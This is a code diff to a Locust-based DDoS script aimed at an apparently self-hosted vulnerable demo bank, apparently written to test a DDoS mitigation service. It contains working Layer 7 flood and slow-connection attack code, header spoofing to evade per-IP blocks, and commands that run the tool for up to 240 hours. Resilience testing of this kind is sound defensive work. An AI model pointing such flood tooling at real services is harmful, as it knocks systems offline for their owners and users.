@@ -14,9 +14,9 @@ Target endpoints (all non-authenticated):
   - GET /api/bill-categories Public API with DB query
 
 Run examples:
-  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --users 200 --spawn-rate 20
-  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --headless --users 200 --spawn-rate 20 --run-time 240h
-  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --headless --users 200 --spawn-rate 20
+  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --users 100 --spawn-rate 10
+  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --headless --users 100 --spawn-rate 10 --run-time 240h
+  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --headless --users 100 --spawn-rate 10
 """
 
 import random
@@ -81,7 +81,7 @@ class L7FloodUser(HttpUser):
     No wait time — designed to maximize RPS and trigger XC DDoS blocks.
     """
 
-    wait_time = constant(0)
+    wait_time = constant(0.1)
 
     def on_start(self):
         ip, ua = pick_identity()
@@ -124,39 +124,32 @@ class L7FloodUser(HttpUser):
 
 class SlowL7User(HttpUser):
     """
-    Slow HTTP attack — holds connections open using stream=True.
-    Each user opens a connection and reads the response body slowly,
-    tying up a server worker thread for as long as possible.
+    Slow L7 attack — many concurrent connections with a long timeout.
+    Does not use stream=True (incompatible with gevent + HTTPS).
+    Connection exhaustion is achieved through high concurrency + slow wait,
+    keeping server worker threads occupied without flooding RPS.
     """
 
-    wait_time = between(0, 1)
+    wait_time = between(1, 3)
 
     def on_start(self):
         ip, ua = pick_identity()
         self.client.headers.update({
             "X-Forwarded-For": ip,
             "User-Agent":      ua,
-            # Advertise a tiny receive window to force slow data delivery
             "Accept-Encoding": "identity",
             "Accept":          "text/html,application/json,*/*",
-            # Keep connection alive — maximises connection hold time
             "Connection":      "keep-alive",
         })
 
     def _slow_get(self, path: str, name: str):
-        """Open a streaming connection and read response body slowly."""
         try:
-            with self.client.get(
+            self.client.get(
                 path,
                 name=name,
-                stream=True,
                 catch_response=True,
-                timeout=60,
-            ) as resp:
-                # Read response byte-by-byte to hold the connection open
-                for _ in resp.iter_content(chunk_size=1):
-                    pass
-                resp.success()
+                timeout=30,
+            ).close()
         except Exception:
             pass
 
